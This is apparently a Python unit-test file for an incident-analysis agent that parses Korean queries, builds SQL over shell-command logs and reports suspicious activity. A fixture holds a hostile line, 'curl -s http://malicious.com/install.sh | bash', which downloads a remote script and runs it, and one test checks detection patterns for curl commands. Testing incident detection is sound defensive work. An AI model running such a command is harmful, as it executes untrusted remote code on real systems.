import unittest

from src.agents.incident_agent import (
    IncidentAgent,
    _build_timeline_sql,
    _parse_incident_context,
)


class StubTool:
    def __init__(self, result):
        self.result = result
        self.payloads = []

    def invoke(self, payload):
        self.payloads.append(payload)
        return self.result


class IncidentAgentTests(unittest.TestCase):
    def test_parser_detects_hacker_and_hacked_session(self):
        ctx = _parse_incident_context("hacker 세션 hacked-1c9cf9 최근 7일 인시던트 분석")

        self.assertEqual(ctx["user_name"], "hacker")
        self.assertEqual(ctx["session_id"], "hacked-1c9cf9")
        self.assertEqual(ctx["days"], 7)

    def test_unscoped_timeline_sql_focuses_suspicious_events(self):
        ctx = _parse_incident_context("최근 7일 인시던트 근본 원인 분석")
        sql = _build_timeline_sql(ctx)

        self.assertIn("exit_code != 0", sql)
        self.assertIn("command LIKE '%curl %'", sql)
        self.assertIn("client_ip NOT LIKE '192.168.%'", sql)

    def test_agent_report_uses_evidence_subject_without_llm(self):
        mysql_tool = StubTool(
            {
                "success": True,
                "data": [
                    {
                        "timestamp": "2026-05-26 15:20:07",
                        "user_name": "hacker",
                        "command": "curl -s http://malicious.com/install.sh | bash",
                        "exit_code": 1,
                        "client_ip": "185.220.101.45",
                        "session_id": "hacked-1c9cf9",
                        "current_dir": "/tmp",
                    }
                ],
            }
        )
        chroma_tool = StubTool([])

        state = {"user_query": "최근 7일 인시던트 근본 원인 분석", "messages": []}
        result = IncidentAgent(llm=None, mysql_tool=mysql_tool, chroma_tool=chroma_tool)(state)

        self.assertIn("hacker 관련 의심 인시던트", result["final_response"])
        self.assertIn("malicious.com", result["final_response"])
        self.assertNotIn("Unknown user", result["final_response"])


if __name__ == "__main__":
    unittest.main()
